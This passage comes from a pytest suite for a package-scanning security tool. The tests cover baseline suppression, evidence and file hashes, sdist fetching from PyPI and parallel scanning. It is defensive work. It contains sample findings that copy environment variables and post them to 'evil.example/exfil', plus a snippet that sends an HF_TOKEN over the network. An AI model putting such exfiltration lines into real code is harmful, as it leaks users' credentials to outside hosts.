    # Must remain ACTIVE so the enforcing gate (exit 1) still trips.
    malicious = _mk(
        target["severity"],
        target["package"],
        target["file"],
        target["check"],
        "Env: L417: env = os.environ.copy()\nNetwork: requests.post('https://evil.example/exfil', data=env)",
    )
    active2, suppressed2 = sp._partition_baseline([malicious], baseline)
    assert active2 == [malicious] and suppressed2 == []


def test_committed_baseline_entries_all_carry_evidence_hash():
    """Every shipped entry must pin an evidence_hash; an entry without one would
    silently fall back to the coarse legacy match for that file/check."""
    import json

    baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
    entries = json.loads(baseline_path.read_text(encoding = "utf-8"))["entries"]
    assert entries, "committed baseline should not be empty"
    missing = [
        f"{e['package']}:{e['file']}:{e['check']}" for e in entries if not e.get("evidence_hash")
    ]
    assert not missing, f"entries missing evidence_hash: {missing[:5]}"
    # And each pinned hash matches a recompute from the stored evidence.
    for e in entries:
        assert e["evidence_hash"] == sp._evidence_hash(e["evidence"]), e["file"]


# sdist fallback: cover sdist-only packages without building.
# PyPI JSON / download are mocked.
class _FakeResp:
    """Minimal urlopen() context-manager stand-in."""

    def __init__(
        self,
        data: bytes = b"",
        status: int = 200,
    ):
        self._data = data
        self.status = status

    def read(self, n: int = -1) -> bytes:
        return self._data

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def _f(packagetype: str, filename: str, url: str) -> dict:
    return {"packagetype": packagetype, "filename": filename, "url": url}


def _meta(
    files: list[dict],
    requires = None,
    version: str = "1.0.0",
) -> dict:
    return {
        "info": {"version": version, "requires_dist": requires or []},
        "urls": files,
        "releases": {version: files},
    }


def test_spec_pin_version():
    assert sp._spec_pin_version("torch==2.3.1") == "2.3.1"
    assert sp._spec_pin_version("torch>=2.0") is None
    assert sp._spec_pin_version("numpy") is None


def test_release_has_wheel_detects_sdist_only():
    sdist_only = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")])
    assert sp._release_has_wheel(sdist_only, None) is False
    assert sp._release_has_wheel(sdist_only, "1.0.0") is False
    has_wheel = _meta(
        [
            _f("sdist", "x.tar.gz", "https://files.pythonhosted.org/x.tar.gz"),
            _f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl"),
        ]
    )
    assert sp._release_has_wheel(has_wheel, None) is True


def test_is_trusted_pypi_url_only_https_pypi():
    assert sp._is_trusted_pypi_url("https://files.pythonhosted.org/p/x.tar.gz") is True
    assert sp._is_trusted_pypi_url("https://pypi.org/x.tar.gz") is True
    assert sp._is_trusted_pypi_url("http://files.pythonhosted.org/x.tar.gz") is False  # not https
    assert sp._is_trusted_pypi_url("https://evil.example/x.tar.gz") is False
    assert sp._is_trusted_pypi_url("https://files.pythonhosted.org.evil.com/x") is False


def test_requires_dist_skips_extras():
    meta = _meta(
        [],
        requires = [
            "numpy (>=1.20)",
            "torch ; extra == 'dev'",  # optional extra -> skipped
            "pyyaml>=5 ; python_version >= '3.8'",  # non-extra marker -> kept
            "payload>=1 ; extra != 'dev'",  # default-true marker -> kept
        ],
    )
    specs = sp._requires_dist_names(meta)
    # Version constraints are preserved so a pinned dep is fetched, not latest.
    assert "numpy>=1.20" in specs
    assert "pyyaml>=5" in specs
    # A default-true marker that merely mentions ``extra`` is NOT optional.
    assert "payload>=1" in specs
    # The extra-gated dep is skipped entirely (no torch under any form).
    assert not any(sp._extract_pkg_name(s) == "torch" for s in specs)


def test_marker_holds_by_default():
    # Optional only when the extra is the sole gate.
    assert sp._marker_holds_by_default("extra == 'dev'") is False
    assert sp._marker_holds_by_default('extra == "dev"') is False
    # Default-true markers that mention extra must be kept.
    assert sp._marker_holds_by_default("extra != 'dev'") is True
    assert sp._marker_holds_by_default("python_version >= '3.8' or extra == 'dev'") is True
    # No marker / plain env marker -> kept.
    assert sp._marker_holds_by_default("") is True
    # Platform/python markers are kept: the scanner runs on one target but the
    # package may install on another, so these deps must still be scanned.
    assert sp._marker_holds_by_default("sys_platform == 'win32'") is True
    assert sp._marker_holds_by_default("python_version == '3.13'") is True
    assert sp._marker_holds_by_default("sys_platform == 'win32' and extra == 'gpu'") is True


def test_requires_dist_for_fails_closed_on_missing_pin_metadata(monkeypatch):
    # The pinned release's own metadata cannot be fetched -> recover nothing rather than substituting the latest
    # release's (wrong) dependency tree.
    project = _meta([], requires = ["latestdep==9.9.9"])
    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
    assert sp._requires_dist_for("oldpkg", "1.0.0", project) == []


def test_requires_dist_for_uses_pinned_release(monkeypatch):
    # Project-level (latest) metadata declares no malicious dep; the pinned release does. _requires_dist_for must follow
    # the pinned release's tree.
    project = _meta([], requires = ["harmless>=1"])
    pinned = _meta([], requires = ["payload==1.0.0"])
    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: pinned if version else project)
    specs = sp._requires_dist_for("oldpkg", "1.0.0", project)
    assert "payload==1.0.0" in specs
    assert "harmless>=1" not in specs


def test_requires_dist_for_records_incomplete_scan_error(monkeypatch):
    # Missing pinned metadata must surface an incomplete-scan error, not a silent [] that a caller cannot tell apart
    # from a genuine no-deps release.
    project = _meta([], requires = ["latestdep==9.9.9"])
    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
    errors: list[str] = []
    assert sp._requires_dist_for("oldpkg", "1.0.0", project, errors) == []
    assert errors and "incomplete" in errors[0]


def test_release_files_pinned_missing_fails_closed():
    # A pin absent from metadata must NOT fall back to the latest artifact.
    meta = _meta(
        [_f("sdist", "x-2.0.0.tar.gz", "https://files.pythonhosted.org/x-2.0.0.tar.gz")],
        version = "2.0.0",
    )
    assert sp._release_files(meta, "9.9.9") == []  # missing pin -> empty, not latest
    assert sp._release_has_wheel(meta, "9.9.9") is False
    assert sp._release_files(meta, "2.0.0")  # present pin still resolves
    assert sp._release_files(meta, None)  # unpinned still uses latest


def test_download_sdist_direct_missing_pin_does_not_scan_latest(tmp_path):
    # Pinned version absent -> no sdist returned (never the latest file).
    meta = _meta(
        [_f("sdist", "x-2.0.0.tar.gz", "https://files.pythonhosted.org/x-2.0.0.tar.gz")],
        version = "2.0.0",
    )
    fpath, err = sp._download_sdist_direct("x", "9.9.9", str(tmp_path), meta = meta)
    assert fpath is None and "no sdist" in err
    assert list(tmp_path.iterdir()) == []


def test_download_sdist_direct_refuses_non_pypi_url(tmp_path):
    meta = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://evil.example/x.tar.gz")])
    fpath, err = sp._download_sdist_direct("x", "1.0.0", str(tmp_path), meta = meta)
    assert fpath is None and "non-PyPI" in err
    assert list(tmp_path.iterdir()) == []


def test_download_sdist_direct_no_sdist_published(tmp_path):
    meta = _meta([_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")])
    fpath, err = sp._download_sdist_direct("x", None, str(tmp_path), meta = meta)
    assert fpath is None and "no sdist" in err


def test_download_sdist_direct_writes_and_preserves_suffix(tmp_path, monkeypatch):
    payload = b"\x1f\x8b" + b"fake-tar-gz-bytes"
    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(payload))
    meta = _meta(
        [_f("sdist", "langid-1.1.6.tar.gz", "https://files.pythonhosted.org/langid-1.1.6.tar.gz")],
        version = "1.1.6",
    )
    fpath, err = sp._download_sdist_direct("langid", "1.1.6", str(tmp_path), meta = meta)
    assert err is None and fpath is not None
    assert fpath.endswith(".tar.gz")  # suffix preserved -> archive reader picks format
    assert Path(fpath).read_bytes() == payload


def test_download_sdist_direct_size_cap(tmp_path, monkeypatch):
    monkeypatch.setattr(sp, "_MAX_SDIST_BYTES", 8)
    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(b"x" * 100))
    meta = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")])
    fpath, err = sp._download_sdist_direct("x", "1.0.0", str(tmp_path), meta = meta)
    assert fpath is None and "cap" in err


def test_per_spec_genuine_failure_is_recorded_error(tmp_path, monkeypatch):
    # A spec that fails pip but HAS a wheel on PyPI is a genuine error (-> exit 2).
    class _Proc:
        returncode = 1
        stderr = "ResolutionImpossible"

    monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: _Proc())
    monkeypatch.setattr(
        sp,
        "_pypi_json",
        lambda name, version = None: _meta(
            [_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")]
        ),
    )
    errors: list[str] = []
    sp._resolve_per_spec_with_deps(["somepkg==1.0.0"], str(tmp_path), {}, errors)
    assert errors and "somepkg" in errors[0]


def test_per_spec_sdist_only_is_not_error(tmp_path, monkeypatch):
    # sdist-only spec: pip fails, PyPI shows no wheel -> direct fetch, no error.
    class _Proc:
        returncode = 1
        stderr = "No matching distribution"

    monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: _Proc())
    monkeypatch.setattr(
        sp,
        "_pypi_json",
        lambda name, version = None: _meta(
            [_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x-1.0.0.tar.gz")]
        ),
    )
    monkeypatch.setattr(
        sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(b"\x1f\x8bdata")
    )
    errors: list[str] = []
    sp._resolve_per_spec_with_deps(["x==1.0.0"], str(tmp_path), {}, errors)
    assert errors == []  # sdist-only handled, not an exit-2 failure
    assert any(p.name.endswith(".tar.gz") for p in tmp_path.iterdir())


# ---------------------------------------------------------------------------
# --fix path: download_packages() returns (results, download_errors); both
# --fix call sites must unpack the tuple, not treat it as the results list.
# ---------------------------------------------------------------------------


def test_find_safe_version_handles_download_tuple(monkeypatch):
    monkeypatch.setattr(sp, "fetch_pypi_versions", lambda name: ["0.9.0", "1.0.0"])
    monkeypatch.setattr(
        sp,
        "download_packages",
        lambda specs, dest, **kw: ([("foo==0.9.0", "/tmp/foo-0.9.0.whl")], []),
    )
    monkeypatch.setattr(sp, "scan_archive", lambda archive_path, name: [])  # clean
    monkeypatch.setattr(sp.os, "makedirs", lambda *a, **k: None)
    monkeypatch.setattr(sp.os, "remove", lambda *a, **k: None)
    monkeypatch.setattr(sp.shutil, "rmtree", lambda *a, **k: None)

    result = sp.find_safe_version("foo", "1.0.0", "/tmp/ignored", max_search = 10)
    assert result == "0.9.0"


def test_run_fix_uses_first_archive_path(monkeypatch):
    monkeypatch.setattr(
        sp,
        "download_packages",
        lambda specs, dest, **kw: ([("foo", "/tmp/foo-1.2.3.whl")], []),
    )
    seen = {}

    def fake_get_downloaded_version(path):
        seen["path"] = path
        return "1.2.3"

    monkeypatch.setattr(sp, "get_downloaded_version", fake_get_downloaded_version)
    monkeypatch.setattr(sp, "find_safe_version", lambda *a, **k: None)
    monkeypatch.setattr(sp.os, "makedirs", lambda *a, **k: None)
    monkeypatch.setattr(sp.shutil, "rmtree", lambda *a, **k: None)

    # CRITICAL package with no pinned version -> must download to resolve it, reaching downloaded[0][1] (the first
    # archive's path).
    entries = [
        {
            "name": "foo",
            "is_git": False,
            "spec": "foo",
            "source_file": None,
            "raw_line": "foo",
            "line_num": 1,
        }
    ]
    sp._run_fix({"foo"}, entries, max_search = 10)  # must not raise

    assert seen.get("path") == "/tmp/foo-1.2.3.whl"


def test_pinned_baseline_entry_only_covers_the_reviewed_file(tmp_path):
    """A file_sha256 pin reopens the finding when anything else in the file changes.

    The evidence for an env-harvest + network finding records the urlopen call but
    not the destination, so a release that repoints the endpoint at an attacker host
    keeps the same evidence hash. Pinning binds the entry to the reviewed bytes.
    """
    bl = tmp_path / "bl.json"
    check = "Harvests environment variables/secrets AND makes network calls"
    reviewed = _mk(sp.CRITICAL, "unsloth-zoo", "z/health.py", check, "Env: L1: token")
    reviewed.file_sha256 = "a" * 64
    sp._write_baseline(str(bl), [reviewed])

    # _write_baseline only pins what was already pinned, so a fresh entry is unpinned.
    doc = json.loads(bl.read_text(encoding = "utf-8"))
    assert "file_sha256" not in doc["entries"][0]
    doc["entries"][0]["file_sha256"] = "a" * 64
    bl.write_text(json.dumps(doc), encoding = "utf-8")
    baseline = sp._load_baseline(str(bl))

    active, suppressed = sp._partition_baseline([reviewed], baseline)
    assert suppressed == [reviewed] and active == []

    # Same package/file/check/evidence, different file bytes -> reopens.
    tampered = _mk(sp.CRITICAL, "unsloth-zoo", "z/health.py", check, "Env: L1: token")
    tampered.file_sha256 = "b" * 64
    active2, suppressed2 = sp._partition_baseline([tampered], baseline)
    assert active2 == [tampered] and suppressed2 == []


def test_unpinned_baseline_entry_is_content_agnostic(tmp_path):
    """Entries without file_sha256 keep the pre-existing behaviour."""
    bl = tmp_path / "bl.json"
    f = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
    f.file_sha256 = "a" * 64
    sp._write_baseline(str(bl), [f])
    baseline = sp._load_baseline(str(bl))
    assert baseline[sp._finding_key(f)] is None

    other = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
    other.file_sha256 = "b" * 64
    active, suppressed = sp._partition_baseline([other], baseline)
    assert suppressed == [other] and active == []


def test_write_baseline_preserves_an_existing_pin(tmp_path):
    """Regenerating must not silently widen a pinned entry back to any content."""
    bl = tmp_path / "bl.json"
    f = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
    f.file_sha256 = "a" * 64
    sp._write_baseline(str(bl), [f])
    doc = json.loads(bl.read_text(encoding = "utf-8"))
    doc["entries"][0]["file_sha256"] = "a" * 64
    bl.write_text(json.dumps(doc), encoding = "utf-8")

    sp._write_baseline(str(bl), [f])
    doc2 = json.loads(bl.read_text(encoding = "utf-8"))
    assert doc2["entries"][0]["file_sha256"] == "a" * 64


def test_check_py_file_stamps_the_file_digest():
    """Findings carry the digest the pin is matched against."""
    src = 'import requests\nimport os\nt = os.environ["HF_TOKEN"]\nrequests.get("http://x", headers={"a": t})\n'
    findings = sp.check_py_file(src, "p/a.py", "p")
    assert findings, "expected at least one finding"
    expected = hashlib.sha256(src.encode("utf-8", "replace")).hexdigest()
    assert all(f.file_sha256 == expected for f in findings)


def test_the_shipped_baseline_hashes_match_their_evidence():
    """A hand-added entry with a stale `evidence_hash` suppresses nothing: the key
    is the hash, not the evidence text beside it, so the finding stays red and the
    entry reads as a review that happened. Recompute every one of them."""
    import json
    import pathlib

    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
    assert entries, "the shipped baseline is empty"
    wrong = [
        (e.get("package"), e.get("file"), e.get("check"))
        for e in entries
        if e.get("evidence_hash") != sp._evidence_hash(e.get("evidence") or "")
    ]
    assert not wrong, f"evidence_hash does not match evidence: {wrong}"


def _baseline_key(entry):
    """The scanner's OWN key, not the raw fields: `_load_baseline` normalizes the
    package name and strips an sdist's version-carrying archive root, so
    `huggingface_hub` and `huggingface-hub`, or `foo-1.0/foo/a.py` and `foo/a.py`,
    collapse to one runtime entry while a raw comparison sees two and reports
    nothing."""
    return (
        sp._norm_pkg(entry.get("package") or ""),
        sp._relpath_in_package(entry.get("file") or ""),
        entry.get("check"),
        entry.get("evidence_hash"),
    )


def _baseline_duplicates(entries):
    """Keys whose entries say the same thing twice, or contradict each other.

    Sharing a key is not itself an error: `_load_baseline` unions the pins under
    one key into a set, so two reviewed versions with identical evidence but
    different surrounding bytes are the supported way to approve both exact files.
    What has no reading is a pin repeated verbatim, or an unpinned entry sitting
    beside a pinned one -- unpinned wins there, so every pin next to it is inert
    and reads as a narrower approval than the baseline actually grants.
    """
    groups = {}
    for entry in entries:
        groups.setdefault(_baseline_key(entry), []).append(entry.get("file_sha256") or None)
    dupes = set()
    for key, pins in groups.items():
        if len(pins) != len(set(pins)) or (None in pins and len(pins) > 1):
            dupes.add(key)
    return dupes


def test_the_shipped_baseline_has_no_duplicate_keys():
    """Two entries saying the same thing means one of them was reviewed against
    code that is no longer there, and nothing says which."""
    import json
    import pathlib

    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
    dupes = _baseline_duplicates(entries)
    assert not dupes, f"duplicate baseline keys: {sorted(dupes)}"


def test_two_reviewed_versions_may_share_a_key_with_distinct_pins(tmp_path):
    """The representation `_load_baseline` exists to support: one evidence string
    approved for exactly two file contents. Rejecting it would force the entry to
    be widened to an unpinned suppression, which approves strictly more."""
    import json

    same = dict(
        package = "requests",
        file = "requests/api.py",
        check = "C2 polling/beaconing loop detected",
        severity = "CRITICAL",
        evidence = "L1:     while True:",
        evidence_hash = sp._evidence_hash("L1:     while True:"),
    )
    entries = [dict(file_sha256 = "a" * 64, **same), dict(file_sha256 = "b" * 64, **same)]
    assert not _baseline_duplicates(entries)

    path = tmp_path / "baseline.json"
    path.write_text(json.dumps({"version": 1, "entries": entries}))
    loaded = sp._load_baseline(str(path))
    assert list(loaded.values()) == [{"a" * 64, "b" * 64}], "the loader unions the pins"


@pytest.mark.parametrize(
    "pins",
    [
        (None, None),  # the same unpinned approval, written twice
        ("c" * 64, "c" * 64),  # the same pin, written twice
        (None, "c" * 64),  # unpinned wins, so the pinned entry is inert
        ("c" * 64, None),  # and in either order
    ],
)
def test_a_key_that_says_the_same_thing_twice_is_still_a_duplicate(pins):
    same = dict(
        package = "requests",
        file = "requests/api.py",
        check = "C2 polling/beaconing loop detected",
        evidence_hash = sp._evidence_hash("L1:     while True:"),
    )
    entries = [dict(same, **({"file_sha256": p} if p else {})) for p in pins]
    assert _baseline_duplicates(entries) == {_baseline_key(entries[0])}


def test_the_duplicate_check_sees_through_normalization(tmp_path):
    """Two entries that differ only in the ways `_load_baseline` normalizes away
    are one runtime key, so a raw field comparison reports nothing and leaves
    exactly the review ambiguity the check exists to catch."""
    import json

    same = dict(
        check = "C2 polling/beaconing loop detected",
        severity = "CRITICAL",
        evidence = "L1:     while True:",
        evidence_hash = sp._evidence_hash("L1:     while True:"),
    )
    entries = [
        dict(package = "huggingface_hub", file = "foo-1.0/huggingface_hub/a.py", **same),
        dict(package = "huggingface-hub", file = "huggingface_hub/a.py", **same),
    ]
    assert _baseline_duplicates(entries) == {_baseline_key(entries[0])}

    raw = [(e["package"], e["file"], e["check"], e["evidence_hash"]) for e in entries]
    assert raw[0] != raw[1], "a raw comparison would have called these distinct"

    path = tmp_path / "baseline.json"
    path.write_text(json.dumps({"version": 1, "entries": entries}))
    assert len(sp._load_baseline(str(path))) == 1


def test_the_pool_worker_returns_what_the_serial_call_returns():
    """`_scan_one` is the only thing the pool runs, so it must be `scan_archive`.

    It also swallows the archive-limit `[WARN]` lines and hands them back, so the
    caller can print them in task order instead of whenever a worker happened to
    reach them. Pin both halves: identical findings, and stderr captured rather
    than leaked.
    """
    for name in ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz"):
        archive = str(FIXTURES / name)
        captured, findings = sp._scan_one((archive, "fixture"))
        assert findings == sp.scan_archive(archive, "fixture"), name
        assert isinstance(captured, str), name


def _oversized_member_wheel(path):
    """A wheel whose declared member size trips the scanner's per-file cap.

    Written rather than committed: the member is 70 MB of zeros, which deflates
    to a few KB, so the archive on disk is small but `info.file_size` is well
    over HARD_MAX_FILE_BYTES and `iter_archive_files` emits its `[WARN]` skip.
    That warning is the thing `_scan_one` captures and the caller replays in
    order, so without it in the corpus the stderr half of the comparison below
    would be comparing two empty strings.
    """
    import zipfile

    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("pkg/huge.py", b"\0" * (sp.HARD_MAX_FILE_BYTES + 4096))
        zf.writestr("pkg/__init__.py", "x = 1\n")
    return path


def test_scanning_in_parallel_finds_exactly_what_scanning_in_series_finds(
    tmp_path, monkeypatch, capsys
):
    """The whole safety argument for the pool is that it changes nothing.

    Drives `main()` over the same corpus at `--jobs 1` (serial branch) and
    `--jobs 4` (pool branch) and demands byte-identical stdout and stderr.
    `download_packages` is stubbed because the parallel loop sits behind it and
    the real one needs PyPI.

    The corpus is deliberately wide rather than the three committed fixtures:

    - 24 archives, so completion order across 4 workers genuinely diverges from
      submission order. `imap(chunksize=1)` yields in submission order, so this
      is what makes the ordering claim real -- with only three instant archives
      `imap_unordered` returns them in order anyway and the check proves nothing.
    - one archive that trips the per-file size cap, so there is a `[WARN]` line
      on stderr to compare. Otherwise the stderr assertion compares "" to "".
    """
    import shutil

    def run(jobs):
        # main() deletes each archive once scanned, so each arm gets its own copies.
        stage = tmp_path / f"stage{jobs}"
        stage.mkdir()
        copies = []
        for i in range(24):
            src = ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz")[i % 3]
            dest = stage / f"pkg{i:02d}-{src}"
            shutil.copy(FIXTURES / src, dest)
            copies.append((f"pkg{i:02d}", str(dest)))
        copies.append(("oversized", str(_oversized_member_wheel(stage / "oversized.whl"))))

        monkeypatch.setattr(sp, "download_packages", lambda *a, **k: (copies, []))
        monkeypatch.setattr(
            sys,
            "argv",
            ["scan_packages.py", "--no-baseline", "--jobs", str(jobs)]
            + [name for name, _ in copies],
        )
        capsys.readouterr()
        rc = sp.main()
        captured = capsys.readouterr()
        return rc, captured.out, captured.err

    rc_serial, out_serial, err_serial = run(1)
    rc_parallel, out_parallel, err_parallel = run(4)

    banner = re.compile(r"^  Scanning \d+ archive\(s\) across \d+ workers\.\.\.\n", re.M)
    assert banner.search(out_parallel), "the pool branch did not run"
    out_parallel = banner.sub("", out_parallel)

    assert out_serial == out_parallel, "parallel scan reported different findings"
    assert err_serial == err_parallel, "parallel scan reported different warnings"
    assert rc_serial == rc_parallel
    assert "CRITICAL" in out_serial
    assert "[WARN]" in err_serial


def test_a_stalled_pool_exits_2_not_1(tmp_path, monkeypatch, capsys):
    """A dead worker is an incomplete scan, and incomplete scans exit 2.

    Exit 1 already means "non-baselined CRITICAL or HIGH findings detected", so a
    stall that exits 1 reports an infrastructure failure as a detected threat, and
    skips the SCAN INCOMPLETE report that tells the operator coverage was lost.

    The first version of the pool raised `SystemExit(<message>)`, which does exactly
    that: CPython prints a non-integer SystemExit value and exits 1.
    """
    import shutil

    stage = tmp_path / "archives"
    stage.mkdir()
    copies = []
    for i, name in enumerate(("malicious_wheel.whl", "clean_wheel.whl")):
        dest = stage / f"pkg{i}-{name}"
        shutil.copy(FIXTURES / name, dest)
        copies.append((f"pkg{i}", str(dest)))

    monkeypatch.setattr(sp, "download_packages", lambda *a, **k: (copies, []))

    class _StalledResults:
        def next(self, timeout = None):
            raise sp.multiprocessing.TimeoutError()

    class _StalledPool:
        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def imap(self, *a, **k):
            return _StalledResults()

    monkeypatch.setattr(
        sp.multiprocessing,
        "get_context",
        lambda _method: type("C", (), {"Pool": lambda _s, processes = None: _StalledPool()})(),
    )
    monkeypatch.setattr(
        sys,
        "argv",
        ["scan_packages.py", "--no-baseline", "--jobs", "4", "pkg0", "pkg1"],
    )

    rc = sp.main()
    captured = capsys.readouterr()

    assert rc == 2, f"a stalled scan must exit 2 (incomplete), got {rc}"
    assert "SCAN INCOMPLETE" in captured.err
    assert "scan stalled" in captured.err


def _tomllib():
    """`tomllib` is stdlib only on 3.11+ (PEP 680); below that, the tomli backport.

    pyproject's requires-python is >=3.9 and testpaths is ["tests/security"], so a bare
    `pytest` from the repo root collects this file on 3.9 and 3.10, where a plain
    `import tomllib` is a ModuleNotFoundError rather than a test result. tomli is already
    a declared dependency there (extras-no-deps.txt pins it for python_version < "3.11"),
    and this is the same shape the rest of the suite already uses -- see
    tests/python/test_windows_xformers_wheel_match.py and
    tests/studio/install/test_install_node_prebuilt_logic.py.
    """
    if sys.version_info >= (3, 11):
        import tomllib
        return tomllib
    return pytest.importorskip("tomli")


def _supported_python_versions(root):
    """Every `python_version` marker value pyproject's requires-python admits."""
    import re

    tomllib = _tomllib()
    with open(root / "pyproject.toml", "rb") as fh:
        spec = tomllib.load(fh)["project"]["requires-python"]
    lo = re.search(r">=\s*3\.(\d+)", spec)
    hi = re.search(r"<\s*3\.(\d+)", spec)
    assert lo, f"cannot read a floor out of requires-python {spec!r}"
    last = int(hi.group(1)) - 1 if hi else int(lo.group(1))
    return [f"3.{minor}" for minor in range(int(lo.group(1)), last + 1)]


def _audited_requirements(root):
    """(source, spec) for everything security-audit.yml feeds to the scanner.

    Both halves, because the workflow has two. `audit-reqs/unsloth-deps.txt` is
    generated from pyproject's `project.dependencies` plus the
    `huggingfacenotorch` extra, and the rest are the studio requirement files
    copied through a `git+` filter. Reading only the second half is how a pinned
    package declared in pyproject goes unchecked.
    """
    tomllib = _tomllib()
    for req in sorted((root / "studio" / "backend" / "requirements").glob("*.txt")):
        for lineno, raw in enumerate(req.read_text(encoding = "utf-8").splitlines(), 1):
            spec = raw.split("#", 1)[0].strip()
            if spec and not spec.startswith("-") and "git+" not in spec:
                yield f"{req.name}:{lineno}", spec
    with open(root / "pyproject.toml", "rb") as fh:
        project = tomllib.load(fh)["project"]
    declared = list(project["dependencies"])
    declared += list(project["optional-dependencies"]["huggingfacenotorch"])
    for spec in declared:
        if "git+" not in spec:
            yield "pyproject.toml", spec


# unsloth_zoo is digest-pinned and deliberately NOT version-pinned, so it is named
# here rather than quietly skipped. The recurrence this guard exists to stop is an
# upstream release we do not control changing the bytes and reddening main on a day
# nobody touched the repo. unsloth_zoo is our own, released in lockstep with this
# package, and pinning it exactly would break that; when its digest reopens, the
# change is one of ours and re-reviewing it is the point of the pin (#8104, and that
# entry is the credential send itself). Third-party packages get no such licence, so
# the test asserts this list holds only first-party names.
# Exactly the first-party packages that ARE digest-pinned today, asserted below to
# be exactly that, so a name added here without an entry, or a third-party name
# added at all, fails rather than silently widening the exemption.
FIRST_PARTY_DIGEST_PINNED = {"unsloth-zoo"}


def test_digest_pinned_packages_are_pinned_on_every_supported_python():
    """A digest-pinned third-party package must be `==` pinned on every Python we support.

    The two mechanisms are only coherent together. `file_sha256` deliberately reopens a
    reviewed CRITICAL on ANY edit to the file, because the evidence records a network
    call and not its destination, so nothing weaker can tell a benign refactor from an
    added credential send. A `>=` spec then hands the choice of file bytes to whatever
    upstream published most recently, so the gate turns red on release day rather than
    on a change anyone here made. That is not hypothetical: `openai>=2.7.2` floated onto
    3.2.0, which touched all four pinned files, and the extras shard went red on main.

    `==` has to mean one version. `openai==3.*` satisfies a naive prefix test and is a
    floating prefix match to pip, which recreates the same failure, so the specifier is
    parsed rather than pattern-matched and a wildcard is rejected.

    And `==` is strictly narrower than `>=`, so pinning the newest release silently
    drops every interpreter that release does not support: openai 3.x needs 3.10, this
    project supports 3.9 back to pyproject's requires-python, and a bare
    `openai==3.2.0` does not resolve there AT ALL, where `>=2.7.2` had been quietly
    picking 2.48.0. A pin that fixes CI by breaking an install is not a fix, so the
    markers on the pinned lines have to cover the whole supported range between them.

    Marker-only, so it stays offline and deterministic. That bounds what the coverage
    half can see: it catches a marker partition with a hole in it (a `>= "3.11"` beside
    a `< "3.10"` leaves 3.10 resolving to nothing), but it cannot catch a single
    unmarked pin whose version happens not to support 3.9, because knowing that means
    asking PyPI for the release's requires-python. Resolving the requirements on each
    supported interpreter is what covers that, and it is done as a resolution
    simulation rather than from here, so this module stays network-free.
    """
    import json
    import pathlib

    from packaging.markers import Marker
    from packaging.requirements import Requirement

    root = pathlib.Path(__file__).resolve().parents[2]
    baseline = json.loads(
        (root / "scripts" / "scan_packages_baseline.json").read_text(encoding = "utf-8")
    )
    pinned_packages = {
        sp._norm_pkg(e["package"]) for e in baseline["entries"] if e.get("file_sha256")
    }
    assert pinned_packages, "no digest-pinned entries; this guard would be vacuous"
    stray = FIRST_PARTY_DIGEST_PINNED - pinned_packages
    assert not stray, f"exemption names a package with no digest-pinned entry: {sorted(stray)}"
    third_party = pinned_packages - FIRST_PARTY_DIGEST_PINNED
    assert third_party, "every digest-pinned package is exempt; this guard would be vacuous"

    pythons = _supported_python_versions(root)
    assert pythons, "no supported python versions parsed out of requires-python"

    floating = []
    covered: dict[str, set[str]] = {}
    present: set[str] = set()
    for source, spec in _audited_requirements(root):
        try:
            requirement = Requirement(spec)
        except Exception:
            continue
        pkg = sp._norm_pkg(requirement.name)
        if pkg not in third_party:
            continue
        present.add(pkg)
        specifiers = list(requirement.specifier)
        exact = (
            len(specifiers) == 1
            and specifiers[0].operator == "=="
            # `==3.*` is a prefix match, not a pin, and pip resolves it to whatever 3.x is newest.
            and not specifiers[0].version.endswith(".*")
        )
        if not exact:
            floating.append(f"{source}: {spec}")
            continue
        marker = requirement.marker
        for python in pythons:
            if marker is None or marker.evaluate({"python_version": python}):
                covered.setdefault(pkg, set()).add(python)

    assert not floating, (
        "these packages carry digest-pinned baseline entries but are not pinned to one "
        "version in what the security audit scans, so it goes red whenever upstream "
        "publishes: " + "; ".join(floating)
    )
    gaps = {
        pkg: sorted(set(pythons) - covered.get(pkg, set()), key = lambda v: int(v.split(".")[1]))
        for pkg in sorted(present)
    }
    gaps = {pkg: missing for pkg, missing in gaps.items() if missing}
    assert not gaps, (
        "a digest-pinned package has no exact pin on some supported Python, so "
        "installing there resolves to nothing at all: "
        + "; ".join(f"{pkg} uncovered on {', '.join(missing)}" for pkg, missing in gaps.items())
    )


def test_the_toml_helpers_run_without_stdlib_tomllib(monkeypatch):
    """The helpers above must work on 3.9/3.10, where `tomllib` does not exist.

    pyproject declares requires-python >=3.9 and testpaths ["tests/security"], so a bare
    `pytest` from the repo root runs this module on 3.9 and 3.10. `tomllib` landed in 3.11
    (PEP 680), so an unguarded `import tomllib` there is a collection-time
    ModuleNotFoundError, not a verdict.

    Simulated rather than skipped: the interpreter running the suite is whatever CI picked
    (3.12 today), so the below-3.11 branch is only ever reached by making the version look
    old AND taking `tomllib` away. Doing only the second is not the same thing -- the
